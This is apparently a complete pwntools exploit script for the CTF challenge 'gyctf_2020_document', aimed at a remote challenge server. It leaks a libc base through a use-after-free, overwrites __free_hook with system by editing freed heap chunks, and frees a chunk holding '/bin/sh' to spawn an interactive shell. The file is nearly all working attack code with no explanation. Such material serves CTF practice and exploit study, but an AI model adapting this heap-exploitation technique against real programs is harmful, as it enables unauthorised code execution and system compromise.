from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv
from subprocess import check_output

s = lambda data: p.send(str(data))
sa = lambda delim,data: p.sendafter(delim,str(data))
sl = lambda data: p.sendline(str(data))
sla = lambda delim,data: p.sendlineafter(delim,str(data))
r = lambda num=4096: p.recv(num)
ru = lambda delims,drop=True: p.recvuntil(delims,drop)
uu64 = lambda data: u64(data.ljust(8,'\0'))
leak = lambda name,addr: log.success('{} = {:#x}'.format(name, addr))

def leak_libc(func,addr,elf=None):
	if elf:
		libc = elf
		base = addr-libc.sym[func]
		leak('base',base)
		system = base+libc.sym['system']
	else:
		libc = LibcSearcher(func,addr)
		base = addr-libc.dump(func)
		leak('base',base)
		system = base+libc.dump('system')

	return (base,libc,system)

context.log_level = 'DEBUG'
binary = './gyctf_2020_document'
context.binary = binary
elf = ELF(binary,checksec=False)
libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
#libc_path = './glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so'
#env={'LD_PRELOAD':libc_path}
libc = ELF(libc_path,checksec=False)
one = map(int, check_output(['one_gadget','--raw',libc_path]).split(' '))
p = remote('node3.buuoj.cn',27061) if argv[1]=='r' else process(binary)

def dbg():
	gdb.attach(p)
	pause()

_add,_free,_edit,_show = 1,4,3,2
def add(name='a'*8,content='b'*0x70):
	sla('choice :',_add)
	sa('name',name)
	sa('sex','W')
	sa('tion',content)

def free(index):
	sla('choice :',_free)
	sla('index :',index)

def edit(index,content):
	sla('choice :',_edit)
	sla(':',index)
	sa('sex?','N')
	sa('tion',content)

def show(index):
	sla('choice :',_show)
	sla(':',index)

# start
add('/bin/sh\x00') # 0
add() # 1
add() # 2
free(1)
show(1)
ru('\n')
base = uu64(r(6))-88-libc.sym['__malloc_hook']-0x10
leak('base',base)
free_hook = base+libc.sym['__free_hook']
system = base+libc.sym['system']

add() # 3
add() # 4
edit(1,flat(0,0x21,free_hook-0x10,1)+p64(0)*10)
edit(4,p64(system)+p64(1)+p64(0)*12)
free(0)
# end

p.interactive()